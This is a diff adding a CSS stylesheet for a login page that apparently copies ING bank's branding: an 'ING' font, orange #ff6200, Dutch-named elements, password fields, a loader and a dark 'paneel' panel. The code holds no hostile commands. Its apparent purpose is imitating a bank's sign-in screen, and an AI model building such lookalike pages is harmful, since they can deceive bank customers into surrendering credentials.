@@ -1,0 +1,349 @@
+@font-face {
+    font-family: 'ING'; /*a name to be used later*/
+    src: url('ing.ttf'); /*URL to font*/
+}
+
+body {margin: 0;
+	font-family: ING;
+	background-color: #f2f2f2;
+	background-image: url('bg.png');
+	color: #333333;}
+
+ul.topnav {
+    list-style-type: none;
+    margin: 0;
+    padding: 0;
+    overflow: hidden;
+    background-color: white;
+	height: 64px;
+	box-sizing: border-box;
+	box-shadow: 0 0 1px 0 rgba(0, 0, 0, 0.12), 0 1px 1px 0 rgba(0, 0, 0, 0.24);
+}
+
+#loader{
+	height: 400px;
+	width: 25%;
+	margin: auto;
+}
+
+#loader h5{
+	font-size: 14px;
+}
+
+#center{
+	position: relative;
+	top: 130px;
+}
+
+.loadd {
+	display: inline-block;
+	position: relative;
+	width: 64px; height: 64px;
+	left: 25px;
+  }
+  .loadd div {
+	box-sizing: border-box;
+	display: block;
+	position: absolute;
+	width: 30px;
+	height: 30px;
+	border: 2.8px solid white;
+	border-radius: 50%;
+	animation: load 1.52s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+	border-color: #ff6200 transparent transparent transparent;
+  }
+
+  .loadd div:nth-child(1) {
+	animation-delay: -0.44s;
+  }
+
+  .loadd div:nth-child(2) {
+	animation-delay: -0.31s;
+  }
+
+  .loadd div:nth-child(3) {
+	animation-delay: -0.15s;
+  }
+
+  @keyframes load {
+	0% {
+	  transform: rotate(0deg);
+	}
+	100% {
+	  transform: rotate(360deg);
+	}
+  }
+  
+
+ul.topnav li.left {float: left;
+			padding-left: 18%;
+			padding-top: 13px;
+			padding-bottom: 13px;}
+
+ul.topnav li a {
+    display: block;
+    color: black;
+    text-align: center;
+
+    text-decoration: none;
+}
+
+ul.topnav li a:hover:not(.active) {background-color: white;}
+
+ul.topnav li a.active {background-color: white;}
+
+ul.topnav li.right {
+					cursor: pointer;
+					display: inline-block;
+					font-size: 1rem;
+					line-height: 1.5;
+					padding-top: 22px;
+					padding-bottom: 13px;}
+
+@media screen and (max-width: 600px){
+    ul.topnav li.right, 
+    ul.topnav li {float: none;}
+}
+
+.rightdiv{
+	float: right;
+	padding-right: 18%;
+}
+
+.test{
+	border-right: 1px solid black;
+	padding-right: 8px;
+	font-weight: 700;
+	font-size: 16px;
+	color: #333333;
+}
+
+.activelan2{
+	padding: 8px;
+}
+
+.login{
+	width: 100%;
+	max-width: 448px;
+	margin-top: 20px;
+	margin-left: 38%;
+	margin-right: 38%;
+	padding: 24px;
+	box-shadow: 0 0 2px 0 rgba(0, 0, 0, 0.12), 0 2px 2px 0 rgba(0, 0, 0, 0.24);
+	background-color: white;
+	border-radius: 5px;
+	}
+	
+	@media screen and (max-width: 754px) {
+		.login {
+		margin-left: 0% !important;
+	}
+}
+	
+#ingtekst{
+		color:#ff6200;
+		font-size: 24px;
+		font-weight: 700;
+	}
+	
+	.box1{
+		            background: transparent;
+            border-top: transparent !important;
+            border-left: transparent !important;
+            border-right: transparent !important;
+		width: 80%;
+		font-size: 16px;
+		font-stretch: 100%;
+		border-bottom: 1px solid rgb(118, 118, 118);
+	}
+	
+	.nieuw{
+		background-color: #F3F8FC;
+	}
+	
+	.nieuw1{
+		padding: 10px;
+		border-radius: 10px;
+	}
+	
+	#nieuwtekst{
+		color: #333333;
+		font-size: 16px;
+		font-weight: 700;
+		line-height: 24px;
+	}
+	
+	#nieuwtekst1{
+		margin-left: 31px!important;
+		margin-top: -10px;
+		margin-bottom: -3px;
+	}
+	
+	button { border:none; background-color: #F3F8FC;} 
+	
+	#infolink{
+		color: #525199;
+		border-bottom: 1px solid #cbcbe0;
+	}
+	
+	#infolink:visited{
+		color: #ab0066;
+		border-bottom: 1px solid #e6b3d1;
+	}
+	
+	#radiotekst{
+		color: #767676;
+		font-size: 12px;
+	}
+	
+input[type=radio   ]:not(old){
+  width     : 2em;
+  margin    : 0;
+  padding   : 0;
+  font-size : 1em;
+  opacity   : 0;
+}
+
+input[type=radio   ]:not(old) + label{
+  display      : inline-block;
+  margin-left  : -2em;
+  line-height  : 1.5em;
+}
+
+input[type=radio   ]:not(old) + label > span{
+  display          : inline-block;
+  width            : 20px;
+  height           : 20px;
+  margin           : 0.25em 0.5em 0.25em 0.25em;
+  border           : 2px solid #ff6200;
+  border-radius    : 50px;
+  background       : white;
+  vertical-align   : bottom;
+}
+
+input[type=radio   ]:not(old):checked + label > span{
+  background :    white;
+}
+
+input[type=radio]:not(old):checked +  label > span > span{
+  display          : block;
+  width            : 10px;
+  height           : 10px;
+  margin-left           : 3px;
+  margin-top           : 3px;
+  border           : 1px solid #ff6200;
+    border-radius    : 50px;
+  background       : #ff6200;
+}
+
+.radiobuttons{
+	margin-top: -10px;
+}
+
+input[type=submit] {
+	color: white;
+    padding:5px 15px; 
+    background:#ff6200; 
+    border:0 none;
+    cursor:pointer;
+    -webkit-border-radius: 5px;
+    border-radius: 5px; 
+	font-size: 19px;
+	font-weight: 700;
+}
+
+#hulp{
+	color: black;
+}
+
+#hulp:hover{
+	text-decoration: none;
+}
+
+.links{
+	width: 100%;
+	max-width: 448px;
+	margin-top: 20px;
+	margin-left: 38%;
+	margin-right: 38%;
+}
+
+@media screen and (max-width: 754px) {
+		.links {
+		margin-left: 0% !important;
+	}
+	}
+
+#link{
+	border-bottom: 1px solid #cbcbe0;
+	text-decoration: none;
+	color: black;
+	font-size: 14px;
+}
+
+#link:hover{
+	border-bottom: 1px solid #525199;
+}
+
+#link:visited{
+	border-bottom: 1px solid #e6b3d1;
+}
+
+input[type=checkbox]:not(old){
+  width     : 2em;
+  margin    : 0;
+  padding   : 0;
+  font-size : 1em;
+  opacity   : 0;
+}
+
+input[type=checkbox]:not(old) + label{
+  display      : inline-block;
+  margin-left  : -2em;
+  line-height  : 1.5em;
+}
+
+input[type=checkbox]:not(old) + label > span{
+  display          : inline-block;
+  width            : 20px;
+  height           : 20px;
+  margin           : 0.25em 0.5em 0.25em 0.25em;
+  border           : 2px solid #767676;
+  border-radius    : 2px;
+  background       : white;
+  vertical-align   : bottom;
+}
+
+input[type=checkbox]:not(old):checked + label > span{
+  background :    #ff6200;
+  border-color: #ff6200;
+}
+
+input[type=checkbox]:not(old):checked + label > span:before{
+  content     : url('checkbox.svg');
+  display     : block;
+  width       : 16px;
+  color       : white;
+  font-size   : 0.875em;
+  line-height : 1em;
+  text-align  : center;
+  text-shadow : 0 0 0.0714em rgb(115,153,77);
+  font-weight : bold;
+}
+
+input[type=text]:focus,input[type=password]:focus  {
+	border-top: transparent !important;
+	border-left: transparent !important;
+	border-right: transparent !important;
+	outline: 0;
+    border-bottom: 2px solid  #ff6200;
+}
+
+.paneel {
+	  background-color: black;
+		color: white;
+		  border: 2px solid #767676;
+		  width: 50%;
+		  text-align: center;
+
+}
